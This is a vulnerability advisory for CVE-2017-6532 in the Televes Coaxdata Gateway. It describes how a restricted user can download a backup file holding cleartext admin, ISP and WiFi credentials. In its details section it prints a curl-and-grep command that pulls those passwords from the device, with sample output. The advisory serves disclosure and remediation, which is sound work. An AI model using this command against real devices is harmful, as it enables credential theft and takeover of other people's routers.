# CVE-2017-6532: Backup containing cleartext credentials is accessible by restricted user in Televes Coaxdata Gateway 1Gbps
## Software
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-Low-yellow?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()

__Vendor:__ Televes<br>
__Vendor URL:__ https://www.televes.com<br>
__Versions affected:__ Televes Coaxdata Gateway 1Gbps<br>
__Discovered by:__ Pedro Andujar ([@pandujar](https://twitter.com/pandujar))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ No<br>

## Summary
A restricted user can download the configuration file and read the admin credentials.

## Details
This issue is in fact two, first one related to the lack of encryption when storing the user provided credentials wthin the 
configuration file, second one regarding the lack of access control to the backup file that should be restricted to admin user. 
This way after logging in with the default "username" credentials, you will only need to access the URL shown below, in order to 
find cleartext users and passwords of WiFI, WPS pin value, WAN (internet provider) and the device Admin account:

```
pandujar@fogheaven:~$ curl http://192.168.2.1/mib.db | grep -i Password

InternetGatewayDevice.DeviceInfo.X_ATH-COM_TeleComAccount.Password -m 1 -d Changeme1 (Admin password)
InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password -m 1 -d Changeme2 (ISP Password)
InternetGatewayDevice.X_ATH-COM_Account.UserPassword -m 1 -d 123456 (username password)

```
## Impact
This vulnerability can be exploited to do an account takeover of the admin user.

## Recommendation
Update the firmware to last version and block the adminsitration web interface on the internet or untrusted networks.

## Timeline
* 27/2/2017 - Reported vulnerability to vendor
* 28/2/2017 - Technical details sent on a 2nd contact attempt
* 01/3/2017 - Manufacturer acknowledge the issues and stats that restricted user would be removed from future releases
* 13/7/2017 - Follow up email related to resolution. No response
* 20/7/2017 - Public Disclosure
* 

#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)